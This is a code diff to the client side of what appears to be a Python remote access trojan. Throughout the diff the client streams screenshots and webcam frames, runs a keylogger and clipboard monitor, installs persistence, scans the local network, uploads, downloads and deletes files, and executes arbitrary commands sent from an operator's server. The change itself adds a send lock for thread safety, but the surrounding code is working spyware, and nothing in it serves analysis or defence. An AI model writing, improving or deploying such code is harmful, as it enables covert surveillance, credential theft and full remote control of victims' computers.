@@ -116,14 +116,18 @@ def _compute_backoff_delays(n_failures):
     return delays
 
 
-def _heartbeat_thread(sock, key, stop_event, interval=30):
-    """Sends PING every `interval` seconds. Stops if stop_event is set or socket dies."""
+def _heartbeat_thread(sock, key, stop_event, send_lock, interval=30):
+    """Sends PING every `interval` seconds. Waits one interval before first send."""
     while not stop_event.is_set():
-        try:
-            send_msg(sock, "PING", key)
-        except Exception:
+        stop_event.wait(interval)  # wait FIRST
+        if stop_event.is_set():
             break
-        stop_event.wait(interval)
+        try:
+            with send_lock:
+                send_msg(sock, "PING", key)
+        except Exception:
+            logger.debug("Heartbeat stopped: socket error")
+            break
 
 
 def test_connection(host, port):
@@ -215,52 +219,63 @@ def list_directory(path):
         return f"[!] Error: {e}"
 
 
-def take_screenshot(sock, key):
+def take_screenshot(sock, key, send_lock):
     if not SCREENSHOT_AVAILABLE:
-        send_msg(sock, "FAIL", key)
+        with send_lock:
+            send_msg(sock, "FAIL", key)
         return
     try:
         screenshot = pyautogui.screenshot()
         img_bytes = io.BytesIO()
         screenshot.save(img_bytes, format="PNG")
-        send_msg(sock, "PASS", key)
-        send_msg(sock, img_bytes.getvalue(), key)
+        with send_lock:
+            send_msg(sock, "PASS", key)
+            send_msg(sock, img_bytes.getvalue(), key)
     except Exception as e:
-        send_msg(sock, "FAIL", key)
+        with send_lock:
+            send_msg(sock, "FAIL", key)
         logger.error(f"Screenshot error: {e}")
 
 
-def capture_webcam(sock, key):
+def capture_webcam(sock, key, send_lock):
     if not WEBCAM_AVAILABLE:
-        send_msg(sock, "FAIL", key)
+        with send_lock:
+            send_msg(sock, "FAIL", key)
         return
     try:
         cap = cv2.VideoCapture(0)
         if not cap.isOpened():
-            send_msg(sock, "FAIL", key)
+            with send_lock:
+                send_msg(sock, "FAIL", key)
             return
         ret, frame = cap.read()
         cap.release()
         if not ret:
-            send_msg(sock, "FAIL", key)
+            with send_lock:
+                send_msg(sock, "FAIL", key)
             return
         ret, buffer = cv2.imencode('.jpg', frame)
         if not ret:
-            send_msg(sock, "FAIL", key)
+            with send_lock:
+                send_msg(sock, "FAIL", key)
             return
-        send_msg(sock, "PASS", key)
-        send_msg(sock, buffer.tobytes(), key)
+        with send_lock:
+            send_msg(sock, "PASS", key)
+            send_msg(sock, buffer.tobytes(), key)
     except Exception as e:
-        send_msg(sock, "FAIL", key)
+        with send_lock:
+            send_msg(sock, "FAIL", key)
         logger.error(f"Webcam error: {e}")
 
 
-def stream_screen(sock, key, stop_event):
+def stream_screen(sock, key, stop_event, send_lock):
     """Stream screen at low fps for live view"""
     if not SCREENSHOT_AVAILABLE:
-        send_msg(sock, "FAIL", key)
+        with send_lock:
+            send_msg(sock, "FAIL", key)
         return
-    send_msg(sock, "PASS", key)
+    with send_lock:
+        send_msg(sock, "PASS", key)
     try:
         while not stop_event.is_set():
             screenshot = pyautogui.screenshot()
@@ -268,7 +283,8 @@ def stream_screen(sock, key, stop_event):
             img_bytes = io.BytesIO()
             screenshot.save(img_bytes, format="JPEG", quality=40)
             frame_data = img_bytes.getvalue()
-            send_msg(sock, frame_data, key)
+            with send_lock:
+                send_msg(sock, frame_data, key)
             ack = recv_msg_str(sock, key)
             if ack != "NEXT":
                 break
@@ -277,7 +293,8 @@ def stream_screen(sock, key, stop_event):
         logger.error(f"Stream error: {e}")
     finally:
         try:
-            send_msg(sock, b"STREAM_END", key)
+            with send_lock:
+                send_msg(sock, b"STREAM_END", key)
         except:
             pass
 
@@ -401,11 +418,14 @@ def main():
             _reconnect_delay = 1
             logger.info("Authenticated, backoff reset")
 
+            # Per-connection send lock (shared by main loop + heartbeat thread)
+            send_lock = threading.Lock()
+
             # Heartbeat
             hb_stop = threading.Event()
             hb_thread = threading.Thread(
                 target=_heartbeat_thread,
-                args=(client, key, hb_stop),
+                args=(client, key, hb_stop, send_lock),
                 daemon=True
             )
             hb_thread.start()
@@ -414,107 +434,131 @@ def main():
                 command = recv_msg_str(client, key)
                 if command is None:
                     logger.warning("Connection lost")
-                    hb_stop.set()
                     break
 
                 if command == "sysinfo":
-                    send_msg(client, get_system_info(), key)
+                    with send_lock:
+                        send_msg(client, get_system_info(), key)
 
                 elif command == "screenshot":
-                    take_screenshot(client, key)
+                    take_screenshot(client, key, send_lock)
 
                 elif command == "webcam":
-                    capture_webcam(client, key)
+                    capture_webcam(client, key, send_lock)
 
                 elif command == "stream_start":
                     stream_stop_event.clear()
-                    stream_screen(client, key, stream_stop_event)
+                    stream_screen(client, key, stream_stop_event, send_lock)
 
                 elif command == "stream_stop":
                     stream_stop_event.set()
-                    send_msg(client, "[+] Stream stopped", key)
+                    with send_lock:
+                        send_msg(client, "[+] Stream stopped", key)
 
                 elif command == "keylogger_start":
                     if keylogger.start():
-                        send_msg(client, "[+] Keylogger started", key)
+                        with send_lock:
+                            send_msg(client, "[+] Keylogger started", key)
                     else:
-                        send_msg(client, "[!] Keylogger unavailable", key)
+                        with send_lock:
+                            send_msg(client, "[!] Keylogger unavailable", key)
 
                 elif command == "keylogger_stop":
                     keylogger.stop()
-                    send_msg(client, "[+] Keylogger stopped", key)
+                    with send_lock:
+                        send_msg(client, "[+] Keylogger stopped", key)
 
                 elif command == "keylogger_dump":
-                    send_msg(client, keylogger.get_logs(), key)
+                    with send_lock:
+                        send_msg(client, keylogger.get_logs(), key)
 
                 elif command == "clipboard_start":
                     if clipboard_monitor.start():
-                        send_msg(client, "[+] Clipboard monitor started", key)
+                        with send_lock:
+                            send_msg(client, "[+] Clipboard monitor started", key)
                     else:
-                        send_msg(client, "[!] Clipboard monitor unavailable (pyperclip not installed)", key)
+                        with send_lock:
+                            send_msg(client, "[!] Clipboard monitor unavailable (pyperclip not installed)", key)
 
                 elif command == "clipboard_stop":
                     clipboard_monitor.stop()
-                    send_msg(client, "[+] Clipboard monitor stopped", key)
+                    with send_lock:
+                        send_msg(client, "[+] Clipboard monitor stopped", key)
 
                 elif command == "clipboard_dump":
-                    send_msg(client, clipboard_monitor.get_history(), key)
+                    with send_lock:
+                        send_msg(client, clipboard_monitor.get_history(), key)
 
                 elif command == "clipboard_current":
                     try:
                         if CLIPBOARD_AVAILABLE:
-                            send_msg(client, pyperclip.paste() or "[Empty clipboard]", key)
+                            with send_lock:
+                                send_msg(client, pyperclip.paste() or "[Empty clipboard]", key)
                         else:
-                            send_msg(client, "[!] pyperclip not installed", key)
+                            with send_lock:
+                                send_msg(client, "[!] pyperclip not installed", key)
                     except:
-                        send_msg(client, "[!] Cannot access clipboard", key)
+                        with send_lock:
+                            send_msg(client, "[!] Cannot access clipboard", key)
 
                 elif command.startswith("persist_install"):
                     if not PERSISTENCE_AVAILABLE:
-                        send_msg(client, "[!] Persistence module unavailable", key)
+                        with send_lock:
+                            send_msg(client, "[!] Persistence module unavailable", key)
                         continue
                     parts = command.split(" ", 1)
                     method = parts[1] if len(parts) > 1 else None
                     success, msg = install_persistence(method=method)
-                    send_msg(client, f"{'[+]' if success else '[!]'} {msg}", key)
+                    with send_lock:
+                        send_msg(client, f"{'[+]' if success else '[!]'} {msg}", key)
 
                 elif command == "persist_remove":
                     if not PERSISTENCE_AVAILABLE:
-                        send_msg(client, "[!] Persistence module unavailable", key)
+                        with send_lock:
+                            send_msg(client, "[!] Persistence module unavailable", key)
                         continue
                     success, msg = remove_persistence()
-                    send_msg(client, f"{'[+]' if success else '[!]'} {msg}", key)
+                    with send_lock:
+                        send_msg(client, f"{'[+]' if success else '[!]'} {msg}", key)
 
                 elif command == "persist_check":
                     if not PERSISTENCE_AVAILABLE:
-                        send_msg(client, "[!] Persistence module unavailable", key)
+                        with send_lock:
+                            send_msg(client, "[!] Persistence module unavailable", key)
                         continue
                     status = check_persistence()
                     result = "Persistence Status:\n"
                     for method, active in status.items():
                         result += f"  {method}: {'ACTIVE' if active else 'inactive'}\n"
-                    send_msg(client, result, key)
+                    with send_lock:
+                        send_msg(client, result, key)
 
                 elif command == "persist_methods":
                     if not PERSISTENCE_AVAILABLE:
-                        send_msg(client, "[!] Persistence module unavailable", key)
+                        with send_lock:
+                            send_msg(client, "[!] Persistence module unavailable", key)
                         continue
                     methods = get_persistence_methods()
-                    send_msg(client, "Available methods:\n" + "\n".join(f"  - {m}" for m in methods), key)
+                    with send_lock:
+                        send_msg(client, "Available methods:\n" + "\n".join(f"  - {m}" for m in methods), key)
 
                 elif command == "scan_network":
                     if not SCANNER_AVAILABLE:
-                        send_msg(client, "[!] Network scanner unavailable", key)
+                        with send_lock:
+                            send_msg(client, "[!] Network scanner unavailable", key)
                         continue
-                    send_msg(client, "[*] Scanning network (this may take a moment)...", key)
+                    with send_lock:
+                        send_msg(client, "[*] Scanning network (this may take a moment)...", key)
                     # Wait for ack
                     recv_msg_str(client, key)
                     report = full_scan_report()
-                    send_msg(client, report, key)
+                    with send_lock:
+                        send_msg(client, report, key)
 
                 elif command.startswith("scan_ports "):
                     if not SCANNER_AVAILABLE:
-                        send_msg(client, "[!] Network scanner unavailable", key)
+                        with send_lock:
+                            send_msg(client, "[!] Network scanner unavailable", key)
                         continue
                     target = command.split(" ", 1)[1]
                     results = scan_ports(target)
@@ -524,13 +568,16 @@ def main():
                             output += f"  {port}/{service}: OPEN\n"
                     if not any(r[2] for r in results):
                         output += "  No open ports found\n"
-                    send_msg(client, output, key)
+                    with send_lock:
+                        send_msg(client, output, key)
 
                 elif command == "scan_arp":
                     if not SCANNER_AVAILABLE:
-                        send_msg(client, "[!] Network scanner unavailable", key)
+                        with send_lock:
+                            send_msg(client, "[!] Network scanner unavailable", key)
                         continue
-                    send_msg(client, get_arp_table(), key)
+                    with send_lock:
+                        send_msg(client, get_arp_table(), key)
 
                 elif command.startswith("upload "):
                     filename = command.split(" ", 1)[1]
@@ -538,34 +585,42 @@ def main():
                     if file_data is not None:
                         with open(filename, "wb") as f:
                             f.write(file_data)
-                        send_msg(client, f"[+] File saved: {filename} ({len(file_data)} bytes)", key)
+                        with send_lock:
+                            send_msg(client, f"[+] File saved: {filename} ({len(file_data)} bytes)", key)
                     else:
-                        send_msg(client, "[!] Failed to receive file", key)
+                        with send_lock:
+                            send_msg(client, "[!] Failed to receive file", key)
 
                 elif command.startswith("download "):
                     filepath = command.split(" ", 1)[1]
                     if os.path.isfile(filepath):
-                        send_msg(client, "PASS", key)
-                        with open(filepath, "rb") as f:
-                            send_msg(client, f.read(), key)
+                        with send_lock:
+                            send_msg(client, "PASS", key)
+                            with open(filepath, "rb") as f:
+                                send_msg(client, f.read(), key)
                     else:
-                        send_msg(client, "FAIL", key)
+                        with send_lock:
+                            send_msg(client, "FAIL", key)
 
                 elif command.startswith("listdir"):
                     parts = command.split(" ", 1)
                     path = parts[1] if len(parts) > 1 else "."
-                    send_msg(client, list_directory(path), key)
+                    with send_lock:
+                        send_msg(client, list_directory(path), key)
 
                 elif command.startswith("delete "):
                     filepath = command.split(" ", 1)[1]
                     try:
                         if os.path.isfile(filepath):
                             os.remove(filepath)
-                            send_msg(client, f"[+] Deleted: {filepath}", key)
+                            with send_lock:
+                                send_msg(client, f"[+] Deleted: {filepath}", key)
                         else:
-                            send_msg(client, f"[!] Not found: {filepath}", key)
+                            with send_lock:
+                                send_msg(client, f"[!] Not found: {filepath}", key)
                     except Exception as e:
-                        send_msg(client, f"[!] Delete error: {e}", key)
+                        with send_lock:
+                            send_msg(client, f"[!] Delete error: {e}", key)
 
                 elif command == "capabilities":
                     caps = {
@@ -578,7 +633,8 @@ def main():
                         "crypto": CRYPTO_AVAILABLE,
                         "platform": platform.system(),
                     }
-                    send_msg(client, json.dumps(caps), key)
+                    with send_lock:
+                        send_msg(client, json.dumps(caps), key)
 
                 elif command == "exit":
                     keylogger.stop()
@@ -590,7 +646,8 @@ def main():
 
                 else:
                     response = execute_command(command)
-                    send_msg(client, response, key)
+                    with send_lock:
+                        send_msg(client, response, key)
 
         except (ConnectionRefusedError, OSError) as e:
             logger.warning(f"Connection failed ({e}), retry in {_reconnect_delay}s")
